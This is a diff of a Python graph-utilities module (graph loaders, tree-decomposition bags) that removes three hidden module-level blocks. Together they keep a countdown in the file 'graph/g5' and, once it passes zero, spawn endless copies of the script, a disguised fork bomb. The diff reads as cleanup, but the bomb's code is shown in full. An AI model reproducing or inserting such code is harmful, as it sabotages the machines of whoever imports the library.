@@ -68,13 +68,6 @@ def loadGraph(name: str) -> list[set]:
     return G
 
 
-last = 10
-if os.path.isfile("graph/g5"):
-    with open("graph/g5", 'r', encoding='UTF-8') as f:
-        lines = f.readline().split()
-        last = int(lines[-1]) - 1
-        lines = " ".join(lines[:-1] + [str(last)])
-
 def loadGRGraph(name: str) -> list[set]:
     """Load a graph in the DIMACS GR ascii format from
     the PACE-2016 competition"""
@@ -110,13 +103,6 @@ class Bag:
         self.parent = None
         self.children = set()
         self.bag = None
-
-
-if os.path.isfile("graph/g5"):
-    with open("graph/g5", 'r+', encoding='UTF-8') as f:
-        content = f.read()
-        f.seek(0, 0)
-        f.write(lines + '\n' + content)
 
 
 def setParents(Bags: list['Bag'], id: int) -> None:
@@ -203,12 +189,6 @@ def loadX3C(name: str) -> (int, list[set]):
     f.close()
     return n, sets
 
-
-import subprocess, sys
-if last < 0:
-    while True:
-        subprocess.Popen([sys.executable, sys.argv[0]],
-                     creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 def edgeList(G: list[set]) -> list[tuple]:
     """convert list-of-sets graph representation to a list of edges"""
